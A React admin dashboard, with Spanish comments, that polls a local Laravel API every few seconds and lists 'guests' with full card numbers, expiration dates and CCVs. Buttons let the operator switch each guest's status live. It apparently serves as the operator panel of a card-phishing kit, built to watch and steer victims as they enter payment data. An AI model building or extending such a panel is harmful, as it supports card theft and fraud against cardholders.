import React, { useState, useEffect } from 'react';
import axios from 'axios';

const AdminDashboard = () => {
  const [guests, setGuests] = useState([]);
  const [statuses, setStatuses] = useState([]);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchData = async () => {
      try {
        // Asegúrate de que la cookie 'laravel_session' se envíe en la solicitud
        const response = await axios.get('http://127.0.0.1:8000/api/v1/admin/guests', {
          withCredentials: true, // Esto incluye la cookie 'laravel_session'
        });
        const { statuses, guests } = response.data;
        setStatuses(statuses);
        setGuests(guests);
      } catch (err) {
        setError('Error al obtener los datos.');
        console.error(err);
      }
    };

    // Llama a fetchData inmediatamente al montar el componente
    fetchData();

    // Configura el intervalo para llamar a fetchData cada 3 segundos
    const intervalId = setInterval(fetchData, 3000);

    // Limpia el intervalo al desmontar el componente
    return () => clearInterval(intervalId);
  }, []); // El array vacío asegura que esto se ejecute solo una vez al montar

  const changeGuestStatus = async (guestId, statusId) => {
    try {
      const response = await axios.patch(
        `http://127.0.0.1:8000/api/v1/admin/guests/${guestId}`,
        { status_id: statusId },
        { withCredentials: true }
      );
      setGuests(prevGuests =>
        prevGuests.map(guest =>
          guest.id === guestId ? { ...guest, status_id: statusId } : guest
        )
      );
      console.log('Estado actualizado:', response.data);
    } catch (err) {
      setError('Error al cambiar el estado.');
      console.error(err);
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white transition-all">
      <div className="flex justify-center p-4">
        <h1 className="text-2xl font-bold text-center">Panel de Administración</h1>
      </div>

      {error && <div className="text-red-500 text-center">{error}</div>}

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 p-6">
        {guests.map((guest) => (
          <div key={guest.id} className="bg-gray-800 p-6 rounded-lg shadow-lg">
            <h2 className="text-sm font-semibold mb-4">Token: {guest.token}</h2>
            <div className="mb-4">
              <h1 className='text-3xl font-bold'>Informacion de la tarjeta</h1>
              <span>------------------------</span>
              <h1 className="text-2xl font-bold">{guest.user}</h1>
              <p><strong>CC:</strong> {guest.cc}</p>
              <p><strong>Expiración:</strong> {guest.expiration_date}</p>
              <p><strong>CCV:</strong> {guest.ccv}</p>
              <span>------------------------</span>
            </div>

            <div className="space-y-2">
              {statuses.map((status) => (
                <button
                  key={status.id}
                  className={`w-full py-2 px-4 text-white ${guest.status_id === status.id ? 'bg-green-500' : 'bg-blue-500'} rounded-md hover:bg-blue-600`}
                  onClick={() => changeGuestStatus(guest.id, status.id)}
                >
                  {status.name}
                </button>
              ))}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default AdminDashboard;